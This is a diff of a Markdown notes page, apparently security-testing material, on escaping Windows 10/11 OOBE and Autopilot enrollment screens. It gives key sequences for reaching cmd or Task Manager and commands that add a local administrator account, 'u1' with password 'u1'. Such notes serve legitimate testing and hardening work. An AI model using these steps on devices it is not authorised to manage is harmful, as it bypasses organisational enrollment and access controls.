@@ -39,26 +39,30 @@ stateDiagram-v2
 ```
 
 ## Option 1 - [Collect logs](https://learn.microsoft.com/en-us/troubleshoot/mem/intune/device-enrollment/understand-troubleshoot-esp#collect-logs)
-```
-SHIFT+F10
-```
+<kbd>SHIFT+F10</kbd>
 
 ## Option 2 - Blind command injection
 
 ### Bypass OOBE in Windows 10:
-```
-CTRL+SHIFT+ESC -> ALT/WIN+TAB -> WIN+R -> cmd.exe -> SHIFT+ENTER
+<kbd>CTRL+SHIFT+ESC</kbd> -> <kbd>ALT/WIN+TAB</kbd> -> <kbd>WIN+R</kbd> -> `cmd.exe` -> <kbd>SHIFT+ENTER</kbd>
+```batch
 net user u1 u1 /add
 net localgroup Administrators u1 /add
 ```
 
 ### Bypass OOBE in Windows 11:
-```
-CTRL+SHIFT+ESC -> ALT+N -> net user u1 u1 /add -> TAB -> SPACE -> ENTER
-CTRL+SHIFT+ESC -> ALT+N -> net localgroup Administrators u1 /add -> TAB -> SPACE -> ENTER
-```
+<kbd>CTRL+SHIFT+ESC</kbd> -> <kbd>ALT+N</kbd> -> `net user u1 u1 /add` -> <kbd>TAB</kbd> -> <kbd>SPACE</kbd> -> <kbd>ENTER</kbd>
 
-### Option 3 - [Enter Audit mode on an image that's configured to boot to OOBE](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/boot-windows-to-audit-mode-or-oobe?view=windows-11#enter-audit-mode-on-an-image-thats-configured-to-boot-to-oobe)
-```sh
-CTRL+SHIFT+F3
-```
+<kbd>CTRL+SHIFT+ESC</kbd> -> <kbd>ALT+N</kbd> -> `net localgroup Administrators u1 /add` -> <kbd>TAB</kbd> -> <kbd>SPACE</kbd> -> <kbd>ENTER</kbd>
+
+## Option 3 - [Enter Audit mode on an image that's configured to boot to OOBE](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/boot-windows-to-audit-mode-or-oobe?view=windows-11#enter-audit-mode-on-an-image-thats-configured-to-boot-to-oobe)
+<kbd>CTRL+SHIFT+F3</kbd>
+
+
+## Option 4 - [Diagnostics page hash export](https://learn.microsoft.com/en-us/mem/autopilot/add-devices#diagnostics-page-hash-export)
+1. <kbd>CTRL+SHIFT+D</kbd> -> `Export logs`
+2. `Right click Local Disc (C:)` -> `Open in new window`
+3. <kbd>ALT+TAB</kbd> (choose explorer)
+4. <kbd>CTRL+L</kbd> -> `taskmgr` -> Enter
+5. <kbd>ALT+TAB</kbd> (choose taskmgr)
+6. <kbd>ALT+N</kbd> -> `cmd` -> <kbd>TAB</kbd> -> <kbd>SPACE</kbd> -> <kbd>ENTER</kbd>
